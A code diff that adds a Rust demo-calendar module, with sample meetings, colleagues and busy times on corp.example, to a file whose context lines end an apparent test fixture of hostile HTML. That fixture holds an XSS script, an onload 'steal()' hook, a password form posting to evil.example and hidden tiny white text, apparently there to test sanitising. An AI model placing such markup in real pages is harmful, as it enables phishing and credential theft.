@@ -150,3 +150,73 @@ const HOSTILE: &str = r#"<html><body onload="steal()"><script>alert('xss')</scri
 <form action="https://evil.example"><input name=password type=password></form>
 <iframe src="https://evil.example/frame"></iframe>
 <p style="font-size:1px;color:#fff">мелкий белый текст</p></body></html>"#;
+
+/// Демо-календарь на текущую рабочую неделю: мои события и занятость коллег.
+pub mod calendar {
+    use postman_calendar::{Busy, BusyKind, Event, EventStatus, FreeBusy, Participant, Partstat, Span};
+
+    /// Понедельник текущей недели, 00:00 в системном часовом поясе (Unix-секунды).
+    pub fn week_start() -> i64 {
+        let now = jiff::Zoned::now();
+        let monday = now.date().checked_sub(jiff::Span::new().days(i64::from(now.weekday().to_monday_zero_offset()))).unwrap_or(now.date());
+        monday.to_zoned(now.time_zone().clone()).map(|z| z.timestamp().as_second()).unwrap_or(0)
+    }
+
+    fn at(day: i64, h: i64, m: i64) -> i64 {
+        week_start() + day * 86_400 + h * 3600 + m * 60
+    }
+
+    fn event(id: &str, title: &str, day: i64, (h, m): (i64, i64), mins: i64, location: &str, tentative: bool) -> Event {
+        Event {
+            id: id.into(),
+            uid: format!("{id}@corp.example"),
+            calendar_ids: vec!["work".into()],
+            title: title.into(),
+            description: String::new(),
+            location: location.into(),
+            span: Span::new(at(day, h, m), at(day, h, m) + mins * 60),
+            all_day: false,
+            status: if tentative { EventStatus::Tentative } else { EventStatus::Confirmed },
+            free_busy: FreeBusy::Busy,
+            participants: vec![Participant { name: "Я".into(), email: "me@corp.example".into(), owner: true, attendee: true, optional: false, status: Partstat::Accepted }],
+            recurring: false,
+        }
+    }
+
+    pub fn my_events() -> Vec<Event> {
+        vec![
+            event("e1", "Планёрка отдела", 0, (9, 30), 30, "Переговорная 1", false),
+            event("e2", "Созвон с заказчиком", 0, (11, 0), 90, "Teams", false),
+            event("e3", "Обед с партнёром", 0, (13, 0), 60, "Кафе", true),
+            event("e4", "Разбор инцидента", 0, (11, 30), 60, "Переговорная 2", false),
+            event("e5", "Планёрка отдела", 1, (9, 30), 30, "Переговорная 1", false),
+            event("e6", "Пресейл: SIEM", 1, (14, 0), 120, "Переговорная 3", false),
+            event("e7", "1:1 с руководителем", 2, (10, 0), 60, "", false),
+            event("e8", "Демо продукта", 2, (15, 0), 60, "Переговорная 1", false),
+            event("e9", "Ревью архитектуры", 2, (15, 30), 90, "Переговорная 2", true),
+            event("e10", "Планёрка отдела", 3, (9, 30), 30, "Переговорная 1", false),
+            event("e11", "Обучение: Stalwart", 3, (12, 0), 180, "Учебный класс", false),
+            event("e12", "Итоги недели", 4, (16, 0), 60, "Переговорная 1", false),
+        ]
+    }
+
+    /// Коллеги для «Помощника планирования»: (имя, адрес, занятость).
+    pub fn colleagues() -> Vec<(&'static str, &'static str, Vec<Busy>)> {
+        let b = |day, (h, m): (i64, i64), mins: i64, kind| Busy { span: Span::new(at(day, h, m), at(day, h, m) + mins * 60), kind };
+        use BusyKind::{Busy as B, Tentative as T, Unavailable as U};
+        vec![
+            ("Иванова Мария", "m.ivanova@corp.example", vec![b(0, (10, 0), 120, B), b(1, (9, 0), 240, B), b(2, (14, 0), 60, T), b(3, (9, 0), 540, U)]),
+            ("Петров Алексей", "a.petrov@corp.example", vec![b(0, (9, 0), 60, B), b(0, (15, 0), 120, B), b(1, (13, 0), 120, B), b(2, (10, 0), 90, B), b(4, (11, 0), 60, T)]),
+            ("Сидоров Игорь", "i.sidorov@corp.example", vec![b(0, (12, 0), 60, B), b(1, (10, 0), 60, B), b(2, (9, 0), 180, B), b(4, (9, 0), 120, B)]),
+            ("Переговорная 3", "room3@corp.example", vec![b(1, (14, 0), 120, B), b(2, (11, 0), 60, B), b(3, (15, 0), 60, B)]),
+        ]
+    }
+
+    /// Моя занятость из событий — для сетки помощника.
+    pub fn my_busy() -> Vec<Busy> {
+        my_events()
+            .iter()
+            .map(|e| Busy { span: e.span, kind: if e.status == EventStatus::Tentative { BusyKind::Tentative } else { BusyKind::Busy } })
+            .collect()
+    }
+}
